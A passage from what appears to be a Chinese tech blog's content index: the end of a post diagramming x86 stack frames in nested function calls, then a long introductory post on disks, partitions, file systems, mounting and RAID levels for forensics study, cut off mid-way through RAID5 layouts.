├─────────────────────────────┤ │ → main 的 EBP │ ← EBP ├─────────────────────────────┤ │ → foo 的局部变量 (4字节) │ ← ESP 指向这里 └─────────────────────────────┘ 低地址 之后执行：\nmov DWORD PTR [ebp-4], 1 给foo的局部变量空间写入值\nfoo调用bar 同样的流程\n高地址 │ main 的 ... │ ├─────────────────────────────┤ │ foo 的参数 │ ├─────────────────────────────┤ │ foo 的返回地址 (ret to main) │ ├─────────────────────────────┤ │ main 的 EBP │ ├─────────────────────────────┤ │ foo 的局部变量 (4字节) │ ├─────────────────────────────┤ │ bar 的参数 │ ├─────────────────────────────┤ │ bar 的返回地址 (ret to foo) │ ├─────────────────────────────┤ │ foo 的 EBP │ ← EBP ├─────────────────────────────┤ │ bar 的局部变量 (4字节) │ ← ESP └─────────────────────────────┘ 低地址 返回过程 首先bar执行MOV ESP, EBP，释放bar栈帧中存放了bar局部变量的地方\n高地址 │ main 的 ... │ ├─────────────────────────────┤ │ foo 的参数 │ ├─────────────────────────────┤ │ foo 的返回地址 (ret to main) │ ├─────────────────────────────┤ │ main 的 EBP │ ├─────────────────────────────┤ │ foo 的局部变量 (4字节) │ ├─────────────────────────────┤ │ bar 的参数 │ ├─────────────────────────────┤ │ bar 的返回地址 (ret to foo) │ ├─────────────────────────────┤ │ foo 的 EBP │ ← EBP ← ESP ├─────────────────────────────┤ │ bar 的局部变量 (4字节) │ （被释放） └─────────────────────────────┘ 低地址 然后执行POP EBP，将ESP指向的内容（foo的EBP）给EBP，然后释放这部分空间\n高地址 │ main 的 ... │ ├─────────────────────────────┤ │ foo 的参数 │ ├─────────────────────────────┤ │ foo 的返回地址 (ret to main) │ ├─────────────────────────────┤ │ main 的 EBP │ ← EBP ├─────────────────────────────┤ │ foo 的局部变量 (4字节) │ ├─────────────────────────────┤ │ bar 的参数 │ ├─────────────────────────────┤ │ bar 的返回地址 (ret to foo) │ ← ESP ├─────────────────────────────┤ │ foo 的 EBP │ （被释放） ├─────────────────────────────┤ │ bar 的局部变量 (4字节) │ （被释放） └─────────────────────────────┘ 低地址 最后执行RET，弹出返回地址，EIP跳转到foo的返回位置（main函数）\n如果有参数则额外RET N释放参数空间\n高地址 │ main 的 ... │ ├─────────────────────────────┤ │ foo 的参数 │ ├─────────────────────────────┤ │ foo 的返回地址 (ret to main) │ ├─────────────────────────────┤ │ main 的 EBP │ ← EBP ├─────────────────────────────┤ │ foo 的局部变量 (4字节) │ ← ESP ├─────────────────────────────┤ │ bar 的参数 │（被释放） ├─────────────────────────────┤ │ bar 的返回地址 (ret to foo) │（被释放） ├─────────────────────────────┤ │ foo 的 EBP │ （被释放） ├─────────────────────────────┤ │ bar 的局部变量 (4字节) │ （被释放） └─────────────────────────────┘ 低地址 这样一来，bar的整个栈帧被销毁，ESP和EBP还原至foo栈帧\nfoo返回也是一样\n下图关于参数划分的栈帧位置有些不同，不过也能辅助理解嵌套调用：\n","date":"2025-10-07T14:46:52+08:00","image":"http://picture.928330.xyz/typora/b0cd314b8588e4e7b43938004c890c48.png","permalink":"https://blog.928330.xyz/p/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%801%E5%86%85%E5%AD%98%E4%B8%8E%E6%B1%87%E7%BC%96/","title":"逆向基础1：内存与汇编"},{"content":"本来是只想写写RAID题目的，但有太多概念不清楚了，不知不觉有点写过头了\u0026hellip;\u0026hellip;\n参考资料：\nRAID\u0026ndash;维基百科 历年美亚杯RAID重组解析汇总\u0026ndash;小谢取证 XDforensics-Wiki Raid重组复习\u0026ndash;0xL4k1d 深入UFSExplorer：自定义RAID配置指南\u0026ndash;M百问 raid重组-mercer 什么是RAID RAID，全称Redundant Array of Independent Disks，独立磁盘冗余阵列是一种将多个独立的物理磁盘驱动器组合成一个逻辑单元的存储技术\n对于操作系统而言，这个由多块磁盘组成的RAID阵列看起来就像一个单一的大容量硬盘\n那么，RAID技术有什么好的？\n数据容错\n因为在多个磁盘上有存储数据的副本或校验信息，RAID可以有效防止因单块磁盘故障而导致的数据丢失\n当一块磁盘损坏时，系统可以利用其余磁盘上的冗余数据进行恢复，这抵御故障并继续运行\n性能提升\n通过将数据分割成小块并同时读写到多个磁盘上，数据传输速率高，读写性能远超单个磁盘\n这种方式也被称为条带化存储，每个条带包含一段连续的数据，同一条逻辑行的数据块分布在不同磁盘上\n条带这个东西不太好用文字理解，举个例子\n假设有两块硬盘DiskA、DiskB，要存储的数据是字符串ABCDEFGH：\n未条带化（普通存储）：\nDiskA：ABCDEFGH DiskB：空 读取的时候只能A读，B不工作\n条带化存储（条带大小2字节）：\n条带号 DiskA DiskB 1 A B 2 C D 3 E F 4 G H 也就是说第一个条带=A（DiskA） + B（DiskB），大小就是AB（两个字节），后面的也以此类推\n同一个条带的上下两部分数据存储在了AB两块磁盘的同一个位置\n每次读取数据时，按照条带来读，无需切换硬盘，和普通的两个盘分别存储有本质区别\n这样读取的时候两块盘可以同时工作，速度几乎翻倍！这就是最简单的RAID0的工作原理\n前置知识 不想看的可以跳转：RAID级别 物理盘（Physical Disk，PD） 是实际存在的硬件存储设备，如HDD（Hard Disk Drive，机械硬盘）、SSD（Solid State Drive，固态硬盘）\nHDD是依靠旋转的磁盘和机械磁头读写数据的传统硬盘，有真实的机械运动，因此读写速度受机械臂移动和盘片旋转限制，随机访问慢，并且不耐摔，但大容量成本低，所以通常用作大容量备份或冷存储\nSSD则完全没有机械部件，数据存储在电子闪存中，读写几乎即时，随机访问和顺序访问速度都很快，是耐摔王，但价格高，写入次数有限，需要通过固件和控制器管理寿命，通常作系统盘和高速应用\n虚拟盘（Virtual Disk ，VD ） 是通过软件技术模拟出来的磁盘存储设备，没有物理结构，但在系统层面像真实磁盘\n常见以下几类：\n本地虚拟盘\n在单台计算机上由操作系统或软件创建的虚拟盘，例如VHD、VMDK之类的，用于虚拟机\n网络存储虚拟盘\n通过网络提供的虚拟盘，可以被多台设备访问，比如：\nNAS（Network Attached Storage）\n文件级存储，通过网络共享文件，常用于家庭或企业文件共享\nSAN（Storage Area Network）\n块级存储，通过高速网络提供虚拟磁盘给服务器使用，多用于企业数据库或虚拟机存储\n云存储虚拟盘\n云服务商提供的块存储或对象存储虚拟盘，把我们的文件放在远程服务器上，这些服务器内部可能是HDD 或SSD，经过虚拟化后提供我们一个虚拟盘，通过网络访问就像访问本地盘一样，例如百度网盘\n网络存储虚拟盘更像企业内部自建硬盘，使用局域网（LAN）\n而云存储虚拟盘是互联网远程虚拟盘，使用互联网（WAN），用户只是远程使用而已\n逻辑盘（Logical Disk ，LD） 是在物理盘上通过软件划分出来的具有逻辑结构的存储区域，依赖物理盘，也叫做分区\n一个物理盘可划分为多个逻辑盘，如Windows的C、D盘，Linux的/dev/sda1、/dev/sda2分区\n为什么要分区？\n隔离数据\n可以将操作系统文件与用户数据分开放置。如果系统分区损坏需要重装，用户数据分区可以不受影响\n使用不同文件系统\n可以在同一块硬盘上为不同的分区创建不同的文件系统，以满足不同需求\n例如，一个ext4分区给Linux用，一个NTFS分区用于和Windows共享数据\n专用空间\n创建专门的分区用作交换空间，作为物理内存的补充\n将频繁读写的文件（如日志）放在独立分区，可以减少磁盘碎片，方便备份和管理\n磁盘组（Disk Group） 是将多块物理盘组合成一个组，RAID阵列就是磁盘组\n扇区（Sector） 物理扇区 是硬盘硬件上可以独立寻址和进行读写操作的最小物理区域\n由于物理层面的原因，没有硬盘能做到一个bit一个bit对数据进行操作\n对于机械硬盘，它指的是盘片上磁道的一个特定弧段，硬盘的磁头在执行一次读写命令时，至少要处理这么大一块物理区域\n对于固态硬盘，它对应于NAND闪存芯片中的一个物理页或块的一部分，是SSD主控能够操作的最小数据单元\n一个物理扇区并不完全用来存储用户数据，它还包含了其余内容，用于确保数据能被准确定位和可靠读写：\n间隙：用于分隔不同的扇区 同步标记：帮助磁头在高速旋转中同步数据读取的时机 地址标记：记录这个扇区的唯一物理地址（哪个磁头、哪个柱面、哪个扇区） 纠错码（ECC）：这是一段根据数据内容计算出来的校验码，在读取数据时，硬盘会重新计算ECC并与存储的ECC进行比对，以发现并纠位错误 这样方便了管理，也产生了空间开销\n随着硬盘容量的急剧增大，使用512字节的物理扇区变得越来越低效，现在很多硬盘物理扇区扩大到了4096字节（4KB），被称为先进格式化（Advanced Format，AF），相当于把8个小扇区的管理开销合并为1个大扇区的开销，空间利用率显著提高，并且更大的扇区意味着可以分配更多的空间给ECC码，从而设计出更好的纠错算法\n糟糕的问题 当我们要写入HDD的数据不足512B的时候，硬盘也会先把包含目标字节的整个扇区512B读入缓存，在缓存中修改要写入的那些字节，之后重新计算ECC，最后把整个512B扇区写回磁盘\n也就是说，硬盘把所有不是512B整数倍的写过程，都变成了读-改-写的过程！这会造成性能的浪费！\n而对于SSD，这个情况更加严重：\nSSD最小写单元是页，通常是4KB，但它最小的可擦除单元却是按照块计算，通常是128KB\n💡 Tip NAND闪存写入页之前页必须是干净的，也就是所有位都是1，不能直接覆盖，而擦除必须整块擦除\n如果把块设置成和页一样大，可擦除最小单位变成4KB，坏块产生概率更高，还会加速磨损\n如果把页设置成和块一样大，写入最小单位变成128KB，小文件写入会严重浪费，性能下降\n所以现在的设置是理论最优喔\n当写入数据不是4KB的整数倍的时候会变成读-改-写，这还好，如果要写的页已经写过，无法覆盖，那就必须擦除，而擦除所带来的改就是整个块的改动，有几百KB，甚至达到MB的级别！\n这就是所谓的“写放大”问题，而它几乎是不可避免的\n逻辑扇区 类似逻辑地址，逻辑扇区是一个抽象概念，是硬盘让操作系统和用户看到的假设出来的东西\n操作系统使用一种名为逻辑块地址 (Logical Block Addressing, LBA) 的方式来访问硬盘\n在这种模式下，整个硬盘被看作一个从0开始编号的、连续线性的逻辑扇区数组，操作系统无需关心数据具体存放在哪个盘片、哪个磁头、哪个柱面上，只需要关心线性的LBA地址就可以了，这极大地简化了软件开发\n比如，当操作系统需要读取数据时，它只用发出简单的指令：给我LBA地址为12345的数据，就会自动取出第12346个扇区（注意扇区编号从0开始的）\n并且，这还保证了新硬件能够兼容旧的操作系统，比如从HDD变为SSD，或改变内部存储结构，只要硬盘的固件能够正确地将操作系统发来的LBA地址请求翻译成对内部物理存储单元的操作即可\n逻辑扇区大小可以与物理扇区不同，接着往下看\n硬盘扇区格式标准 512n（512 Native，512原生） 最传统的标准，即硬盘的物理扇区大小和逻辑扇区大小都是512字节\n所见即所得，操作系统看到的逻辑结构与硬盘的物理结构完全一致，不存在转换和模拟\n512e（512 Emulation，512模拟） 这是当前最主流的标准，硬盘的物理扇区大小是4096字节 (4KB)，但它对外伪装成512字节的逻辑扇区与操作系统沟通，来保证对旧软件和操作系统的向后兼容性\n在windows的cmd，使用下面的命令可以查看C盘扇区大小：\nfsutil fsinfo ntfsinfo C: 但这样也会导致问题：当操作系统尝试写入一个未与底层4KB物理扇区边界对齐的512字节逻辑扇区时，就会触发一次之前说过的读-改-写操作，这被称为未对齐写入，也会导致性能下降\n4Kn（4K Native，4K原生） 最现代的标准，硬盘的物理扇区大小和逻辑扇区大小都是4096字节\nLinux系统的物理盘与逻辑盘表示 在Linux的设计哲学中，有一个核心思想是“一切皆文件”，这意味着硬件设备，如硬盘、键盘、鼠标等，都会在文件系统中以一个特殊文件的形式存在\n这些设备文件都集中存放在/dev目录（也就是device的意思）下，通过读写这些文件，就可以与对应的硬件设备进行交互\n设备命名规则 一般格式：\n/dev/[设备类型][磁盘序号][分区号] sd (通用硬盘) 这是最常见的前缀，源于 \u0026ldquo;SCSI disk\u0026rdquo;\n它被广泛用于表示几乎所有类型的现代硬盘，包括SATA硬盘、SAS硬盘，甚至U盘和通过USB连接的移动硬盘\n其命名方式为：\n/dev/sd\u0026lt;X\u0026gt;\u0026lt;N\u0026gt; \u0026lt;X\u0026gt;：表示磁盘序号的字母 (a，b，c…)，按内核检测到的顺序分配 \u0026lt;N\u0026gt;：表示该磁盘上的分区号 (1，2，3…)，此部分是可选的，没有则代表整块硬盘 eg：\n/dev/sda：表示系统中第一块被识别的sd类型物理硬盘 /dev/sdb2：表示第二块sd类型硬盘上的第2个分区 hd（IDE硬盘） 是\u0026quot;Hard disk\u0026quot;的缩写，这是早期用于表示IDE/PATA接口硬盘的前缀，在现代系统中已非常少见\n其命名方式基本和sd相同：\n/dev/hd\u0026lt;X\u0026gt;\u0026lt;N\u0026gt; \u0026lt;X\u0026gt;：表示磁盘序号的字母 (a，b，c…)，按内核检测到的顺序分配 \u0026lt;N\u0026gt;：表示该磁盘上的分区号 (1，2，3…)，此部分是可选的，没有则代表整块硬盘 eg：\n/dev/hda：表示第一块IDE硬盘 /dev/hdb2：表示第二块IDE硬盘上的第2个分区 vd（虚拟化硬盘） 是\u0026quot;Virtual disk\u0026quot;的缩写，常见于KVM等虚拟化环境中，代表分配给虚拟机的虚拟硬盘\n其命名方式也和sd大差不差：\n/dev/vd\u0026lt;X\u0026gt;\u0026lt;N\u0026gt; \u0026lt;X\u0026gt;：表示磁盘序号的字母 (a，b，c…)，按内核检测到的顺序分配 \u0026lt;N\u0026gt;：表示该磁盘上的分区号 (1，2，3…)，此部分是可选的，没有则代表整块硬盘 eg：\n/dev/vda：表示分配给当前虚拟机的第一块虚拟硬盘 /dev/vdb1：表示第二块虚拟硬盘上的第1个分区 nvme（NVMe固态硬盘） 表示通过**NVMe (Non-Volatile Memory Express，非易失性存储器快速通道）**协议连接的高速固态硬盘\n其命名方式有些特殊：\n/dev/nvme\u0026lt;X\u0026gt;n\u0026lt;Y\u0026gt;p\u0026lt;Z\u0026gt; \u0026lt;X\u0026gt;：表示NVMe控制器的序号，从0开始 n\u0026lt;Y\u0026gt;：表示控制器下的命名空间（可以理解为磁盘），从1开始 p\u0026lt;Z\u0026gt;：表示该磁盘上的分区号，从1开始 eg：\n/dev/nvme0n1：表示第0个控制器上的第1块NVMe磁盘 /dev/nvme1n2p2：表示第1个控制器上的第2块NVMe磁盘上的第2个分区 mmcblk（eMMC / SD卡） 用于表示嵌入式设备中的存储，如eMMC闪存或SD/TF卡\n其命名方式也有点不同：\n/dev/mmcblk\u0026lt;X\u0026gt;p\u0026lt;Y\u0026gt; \u0026lt;X\u0026gt;：表示eMMC/SD卡设备的序号，从0开始 p\u0026lt;Y\u0026gt;：表示该设备上的分区号，从1开始 示例：\n/dev/mmcblk0：表示系统中第一张被识别的SD卡或eMMC芯片 /dev/mmcblk1p1：表第二张卡上的第1个分区 分区编号的规则 分区号N的分配方式并总是从1开始就一直向后排，它与硬盘的分区表格式有关，主要有两种：MBR和GPT\nMBR (Master Boot Record，主引导记录) 这是一种较老的分区方案，限制一块MBR硬盘最多只能有4个主分区\n为了突破4个分区的限制，可以将其中一个主分区设置为扩展分区，然后在扩展分区内部可以创建多个逻辑分区\n因此，分区编号1到4总是留给主分区或扩展分区，逻辑分区的编号则从5开始\n所以，如果我们看到一块硬盘的分区是/dev/sda1、/dev/sda2、/dev/sda5，这通常意味着sda1和sda2是主分区，而 sda5 是扩展分区里的第一个逻辑分区\nGPT (GUID Partition Table，GUID分区表) 这是一种更现代、更灵活的分区方案，是当前的主流标准，理论上支持无限个分区（但操作系统通常限制为128个）\n没有主分区、扩展分区、逻辑分区的复杂概念，所有分区地位平等\n分区编号就是简单地从1开始连续递增，如/dev/sda1、/dev/sda2、/dev/sda3\u0026hellip;\n实例 在linux里使用lsblk (list block devices，列出块设备) 命令可以清晰地看到系统中的磁盘和分区结构\n假设一台Linux服务器有两块SATA硬盘，lsblk的输出如下（我现有的linux机分盘都很少，杜撰一个吧）：\nNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 238.5G 0 disk // 第一块物理硬盘，总容量为238.5G ├─sda1 8:1 0 512M 0 part /boot/efi\t// sda上的第一个分区，大小为512M，被挂载到了/boot/efi目录 └─sda2 8:2 0 238G 0 part /\t// sda上的第二个分区，大小为238G，被挂载为根目录/ sdb 8:16 0 931.5G 0 disk // 第二块物理硬盘，总容量为931.5G └─sdb1 8:17 0 931.5G 0 part /data\t// sdb上的第一个分区，大小为931.5G，被挂载到了/data目录 列名 含义 NAME 设备名，例如sda，sda1等 MAJ:MIN 主设备号:次设备号，用于Linux内核识别设备 RM 是否为可移动设备（1是可移动，如U盘或光驱，0是固定磁盘） SIZE 设备或分区的大小 RO 是否为只读（1是只读，0是可读写） TYPE 设备类型 MOUNTPOINT 当前挂载点路径，没有挂载则为空 文件系统 当我们有了一个分区后，它还只是一片空白的存储空间，我们还需要一种规则来组织和管理将要存入其中的数据，这种规则就是文件系统，文件系统本质上是操作系统的一部分\n在windows的cmd下，可以使用下面命令查看所有卷的文件系统：\nwmic logicaldisk get name,filesystem 在linux则可以使用下面的命令：\ndf -T 格式化 在一个分区上创建文件系统的过程，就叫做格式化（Format）\n从技术上讲，格式化的核心就是在指定的分区上创建一套全新空白的文件系统，就像拿到一本空白的笔记本，在第一页画好目录的表格，为之后写内容做好组织规划\n不过为什么我们日常的体验是“格式化=擦除数据”呢？\n这完全取决于我们执行的是哪一种格式化，格式化主要分为两种：快速格式化和完全格式化\n快速格式化 操作系统只会擦除文件系统的索引区域，然后写入一套新的空白的索引，不会处理真正存储内容的数据区域\n对操作系统来说，既然目录已经是空白的了，那它就认为这个分区上没有任何文件，因此硬盘看起来是空的\n但实际上，之前的所有数据都还原封不动地在磁盘上，只是失去了能够找到它们的索引信息\n也正因如此，数据恢复可能性非常高，数据恢复软件会跳过被删除的目录，直接扫描整个硬盘的数据区域，根据文件头信息和数据结构来重建出原始文件\n完全格式化 既删除目录，也擦除所有内容\n执行完全格式化，操作系统会做两件事：\n执行一次快速格式化，创建新的空白文件系统。 从头到尾扫描整个分区，并向每一个扇区的每一个bit写入0 这样一来，所有旧数据都会被毫无意义的0数据彻底覆盖掉。硬盘被真正地清空了，完全不能恢复\n常见的文件系统类型 FAT 全称File Allocation Table，文件分配表\n结构简单，兼容性极佳，几乎所有主流操作系统和电子设备都支持，常用于U盘、SD卡、移动硬盘，作为跨平台数据交换的媒介\nFAT文件系统关键结构就是FAT，即文件分配表，作用就是记录磁盘上每个簇的使用情况和文件存储位置，簇是磁盘上最小的数据分配单位，由若干扇区组成\nFAT的分区大小=最大簇数×每簇大小，最大簇数由每个簇编号占用的位数决定，通常写在名字里，比如FAT12就是每个簇用12位表示，最大簇数2¹²=4096个，而每簇大小不太固定\nFAT16\n非常早期的版本，在DOS和Windows 95时代流行，已经基本被淘汰\n最大仅支持2GB的分区（在某些系统中可达4GB）\nFAT32\n是FAT16的改进版本，但它依旧无法管理大于4GB的单个文件，并且最大分区支持也有限（Windows上限制为32GB，理论上可达2TB）\nexFAT (Extended File Allocation Table)\n由微软推出，专为解决FAT32的缺点\n它打破了4GB单文件和分区大小的限制，同时针对闪存介质的特性进行了优化，减少了不必要的写入操作\nNTFS 全称New Technology File System，新技术文件系统\n是Windows系统的标准文件系统，支持大文件和大分区，并提供文件权限管理、加密、日志、压缩等强大功能，可靠性和安全性高\n感兴趣可以看看我的另一篇博客：NTFS系统 ReFS 全称Resilient File System，弹性文件系统\n是微软为Windows Server系统推出的、旨在替代NTFS的新一代文件系统，但它的核心设计目标不是替代桌面版的NTFS，而是为数据中心和大规模存储提供更高的数据完整性和可用性\n它通过对元数据和可选的用户数据进行校验和来主动检测和修复数据损坏，其写入时复制（Copy-on-Write）机制确保了在写入过程中发生意外时，旧数据不会被破坏，极大地增强了数据恢复能力\n常用于Windows Server的存储空间和Hyper-V虚拟化场景\next 全称Extended File System，扩展文件系统\nLinux系统的标准文件系统，用于几乎所有的Linux发行版，从桌面到服务器，以及安卓手机的内部存储\next2\n经典的早期版本，性能良好，但与FAT类似，缺少日志功能，在服务器等场景下可靠性不足\next3\n它在ext2的基础上加入了日志功能，在不改变底层结构的情况下，极大地提升了文件系统的可靠性，成为了许多Linux发行版的长期默认选项\next4\n当前的主流标准，它在前代基础上引入了多项重要改进，如Extents（优化大文件的存储方式，减少碎片并提升性能）、支持更大的文件和卷、更快的自检速度等，使其更现代化、性能更强\nBtrfs 全称B-tree File System\n是Linux的新一代文件系统，旨在替代ext系列文件系统，尤其适合企业级存储和虚拟化环境\nBtrfs内置了快照、校验和、数据压缩、写时复制以及多磁盘管理等功能，它非常灵活，允许动态地添加、删除设备和调整卷大小，目前已成为一些Linux发行版（如Fedora, openSUSE）的默认文件系统\nXFS 全称Extended Filesystem X，扩展文件系统X\n是一种高性能日志文件系统，最初由硅谷图形公司SGI为其IRIX操作系统开发，后来被Linux采用\nXFS的结构设计使其在文件数量和大小增长时，性能下降幅度很小，特别适合处理大文件和高并发读写场景\n因其稳定性和高吞吐量的特性，XFS成为了许多企业级Linux发行版（如Red Hat Enterprise Linux及其衍生版CentOS）的默认文件系统，尤其适用于数据库、媒体服务器和科学计算等场景\ntmpfs 全称Temporary File System，临时文件系统\n是Linux下的一种虚拟文件系统，完全驻留在内存中，用于存放临时文件\n数据不持久，重启后丢失，支持动态调整大小，常用于/tmp、/run等目录\ndevtmpfs 全称Device Temporary File System，设备临时文件系统\n是Linux内核专门为/dev目录提供的虚拟文件系统，用于管理设备节点\n在内存中动态生成，不占用硬盘，系统启动早期即可挂载，方便设备驱动初始化\nHFS+ 与 APFS HFS+全称Hierarchical File System Plus，分层文件系统增强版\nAPFS全称Apple File System，苹果文件系统\n他们都是苹果macOS系统的文件系统，HFS+是长期的标准，而APFS（Apple File System）是从2017年开始推出的新一代文件系统，专门为固态硬盘和闪存优化，性能和可靠性更强\n卷（Volume） 卷是将分区格式化后, 创建了文件系统, 能够被系统所识别和访问的存储区域\n在最简单的情况下，一个卷和一个分区是一一对应的，比如在一块硬盘上划分了C、D两个分区，那么就有两个对应的卷\n但一个卷也可以跨越多个分区，甚至多块物理硬盘，例如RAID阵列，在操作系统看来就是一个跨越了多块物理盘的巨大逻辑卷\nWindows物理磁盘的管理模式 基础磁盘 (Basic Disk) 这是Windows系统默认的磁盘类型，当我们初始化一块新硬盘时，系统默认会将其设置为基础磁盘\n它使用我们之前讨论过的传统分区表（MBR或GPT）来组织磁盘\n基础磁盘上的一个分区（或简单卷）不能跨越到多个物理磁盘上，每个分区都完全包含在一块物理硬盘的内部\n动态磁盘 (Dynamic Disk) 这是Windows提供的一种更高级的磁盘管理模式，它提供了基础磁盘所不具备的许多高级功能\n动态磁盘不使用传统的分区表来定义卷，而是使用一个逻辑磁盘管理器（LDM，Logical Disk Manager）的数据库来跟踪所有动态卷的信息，这个数据库会被复制到系统中每一个动态磁盘上，以实现冗余\n动态磁盘允许创建跨越多个物理硬盘的卷（这实际上就是一种软件RAID的实现，后面会讲到）\n简单卷\n功能上等同于基础磁盘上的一个分区，但它只能在动态磁盘上创建\n跨区卷\n将来自多个物理磁盘上的未分配空间合并成一个巨大的卷\n数据会先写满第一块盘的空间，然后再接着写到下一块盘，类似JBOD（Just a Bunch of Disks）概念\n带区卷\n将数据条带化地同时写入到多个物理磁盘上，以提高读写性能，等同于软件RAID0\n镜像卷\n将数据完全一致地写入到两块物理磁盘上，实现数据冗余，等同于软件RAID1\nRAID-5 卷\n将数据和奇偶校验信息条带化地分布到三个或更多的物理磁盘上，等同于软件RAID5\n它无需昂贵的硬件RAID卡，就能在操作系统层面实现RAID功能，管理非常灵活\n但不好的是兼容性差，因为这是微软的专有技术，Linux和macOS系统通常无法原生识别动态磁盘卷\n此外，从动态磁盘转换回基础磁盘，需要删除磁盘上的所有卷，会导致数据丢失\n驱动器（Drive） 驱动器是指可以存储和访问数据的存储单元，它可以是分区、卷或者磁盘\n物理驱动器：真实存在的硬盘或固态盘\n逻辑驱动器：操作系统识别后的分区或者卷\n虚拟驱动器：通过工具在内存中创建的模拟磁盘，操作系统可像对待真实磁盘一样访问\nWindows\n每一个驱动器都会有一个驱动器号，是Windows系统为方便用户访问而给卷分配的标识符，例如C:、D:\n我们完整看到的驱动器号过程应该是这样的：\n物理硬盘 → 分区 → 文件系统 → 卷 → 挂载 → 驱动器\n比如我们插入U盘，系统会识别分区，然后作为卷挂载，它是实打实的新的硬盘空间\n而当用FTKImager这样的工具挂载镜像时，软件会在内存中创建一个虚拟磁盘，Windows会识别其中的卷，并给它分配一个驱动器号，之后就能在“我的电脑”里看到一个新盘符，空间来源就是镜像文件\nLinux\n驱动器不会用盘符标识，而是通过设备文件和挂载点来管理，比如/dev/sda1挂载到/home\n挂载（Mount） 挂载是将存储设备（磁盘、分区、镜像、容器等）接入文件系统，从而让用户和程序能够访问其内容的过程\n挂载前，设备的内容是孤立的，操作系统无法通过普通路径访问\n挂载后，就可以通过某个路径访问设备里的数据了\n而挂载点就是操作系统用来访问挂载设备的路径或位置，在Linux通常是一个空目录，比如 /mnt/usb、/media/cdrom，而Windows默认挂载方式是分配驱动器号，也可以挂载到空目录\nwindows挂载 插入U盘、使用软件挂载镜像应该都很熟悉了，这里正好借着我添加移动硬盘的过程来说一下：\n首先win+x组合键调出功能栏，打开磁盘管理\n新的硬盘会显示未分配空间，是灰色的（我的分配好了），在这上面右键，选择新建简单卷：\n一直下一步默认，其中会让你选择驱动器符号和填写磁盘名称，按自己的喜好来就行\nLinux挂载 命令行挂载：\nmount /dev/sdb1 /mnt/usb /dev/sdb1是要挂载的目标，/mnt/usb是挂载点\n查看挂载信息：\nmount # 查看当前所有挂载 df -h # 查看挂载的设备及占用空间 卸载设备：\numount /mnt/usb # 或 umount /dev/sdb1 Linux的文件系统是树结构，所有挂载都是挂在这个树上\nRAID级别 ok啊，终于进入正题了\n根据不同的数据组织方式和冗余策略，形成有不同的RAID级别\n找资料的时候看见一张特好玩的图：\n等看完下面的内容就懂了，虽然不太准确，但还是挺形象的hhh\n💡 Tip 图里前三个并不是RAID的概念，而是数据存取/服务部署的概念，最好了解一下\nStandalone（单机部署/单盘存取）\n只能从一块硬盘获取数据，如果硬盘挂掉，那么数据就不可用\n对于服务，则是只把服务部署在一个主机，服务坏了就坏了\nHotswap（热插拔）\n热插拔是指在系统运行过程中，可以直接插入或拔出硬件设备，而不需要关机或重启系统\n而**热备技术（HotSpare，简称HS）**就是依靠它实现：一块硬盘工作，另一块硬盘作为热备，当主盘故障时系统自动切换到备用盘\n服务部署也是同理，以一个服务作为热备，随时顶替\nCluster（集群）\n同一数据存储在多个硬盘里/同一服务部署在多台主机上，形成集群，一个坏了另一个还能用\n和HS不一样的是会切换硬盘/主机\n嗯，图里的这种幽默也由此可见一斑了\nRAID0：条带化 2个以上硬盘并联\n将数据分块，无冗余地并行写入阵列中的所有磁盘，空间利用率高高的，就是磁盘本身的容量\n读写性能极高，是所有RAID级别中理论速度最快的\n但也因为没有任何数据冗余，任何一块磁盘损坏都会导致所有数据的丢失\nRAID1：镜像 将数据完整地复制到另一块或多块磁盘上，形成互为镜像的副本，提供了很高的数据安全性\n但其磁盘空间利用率只有一半，并且写入性能相比单盘没有提升（没有使用条带化），是比较不行的冗余方式\nRAID2：位级条带化+汉明码校验 在位级别上对数据进行条带化，并使用专门的磁盘存储汉明码进行错误校验，实时纠正单位数据错误\n这种方式实现复杂，可用空间是(N-P)*S，其中N是总盘数，P是校验盘数，S是盘容量\n校验盘的数量P与数据盘的数量有关，关系有点复杂，就不展开了\n随着现代硬盘自带纠错功能，该级别已被市场淘汰了\nRAID3：块级条带化+专用校验盘 在字节级别上进行数据条带化，使用一块专用的磁盘来存储所有数据的奇偶校验信息，可用空间是(N-1)*S\n至少使用三块硬盘，如果只有两块就和RAID1一样了\n由于数据按字节分布在所有数据盘上，任何读写操作都需要所有磁盘协同工作，这使其不适合处理大量随机的小型读写请求，适合大块连续数据的读写，例如未压缩视频编辑\n但由于所有校验操作都集中在一块专用盘上，导致高并发随机写入的性能被大幅限制，因此也已很少使用\nRAID4：块级条带化+专用校验盘 在块级别上对数据进行条带化，并同样使用一块专用磁盘存储奇偶校验信息，所以可用空间也是(N-1)*S\n至少使用三块盘，理由和RAID3一样\n相比RAID3，改善了小文件的读取性能，因为读取请求可以由单个数据盘独立完成\n但写入操作时，这块专用的校验盘依然制约了性能，核心问题并未得到解决\nRAID5：分布式奇偶校验 在块级别上条带化数据，将奇偶校验信息交错地分布到所有磁盘上，性能、容量和安全性之间有很好的平衡\n因为奇偶校验信息占据的空间刚好是一块盘，所以可用空间也是(N-1)*S\n至少使用三块硬盘，如果只有两块的话就无法存储完整的条带信息了\n它可以在单块磁盘损坏时不丢失数据，因为后续的读取可以通过阵列中剩余的数据和奇偶校验块计算出来\n但由于奇偶校验计算是在整个条带上进行的，其每个写入操作都需要重新计算校验值，性能会有一定损失\n由于RAID5是非常常用的类型，也是电子取证重点考察的部分，我们重点讲一下它\nRAID5的核心在于其校验数据的分布式存储，其校验原理基于异或运算(XOR，用符号^代指)\n例如，RAID5存储方式下有A1, A2, A3三个数据块，其校验块Ap的计算方式为Ap = A1 ^ A2 ^ A3，如果其中一个数据块（如A2）丢失，可以通过A2 = A1 ^ A3 ^ Ap来恢复\n而校验块在磁盘间的分布规律，即所谓“循环方式”，是重组中最关键的一环\n它由两个东西决定：循环方向和同步性（对称性）\n循环方向 决定RAID5每条条带的奇偶校验块（P）在不同磁盘上的分布方式\n左循环 校验块P0, P1, P2...从阵列的最后一个盘开始，从右向左依次移动\n条带号 Disk0 Disk1 Disk2 Disk3 0 P0 1 P1 2 P2 3 P3 4 P4 5 P5 右循环 校验块P0, P1, P2...从阵列的第一个盘开始，从左向右依次移动\n条带号 Disk0 Disk1 Disk2 Disk3 0 P0 1 P1 2 P2 3 P3 4 P4 5 P5 同步性（对称性） 决定写数据和校验时，磁盘是否按固定顺序同时参与写入\n下面内容我们默认使用左循环的方式，填入D0~D8这九个数据块\n异步（不对称） 下一个数据条带的起始数据块总是从0号盘开始写入，不考虑上一行校验块的位置\n条带号 Disk0 Disk1 Disk2 Disk3 0 D0 D1 D2 P0 1 D3 D4 P1 D5 2 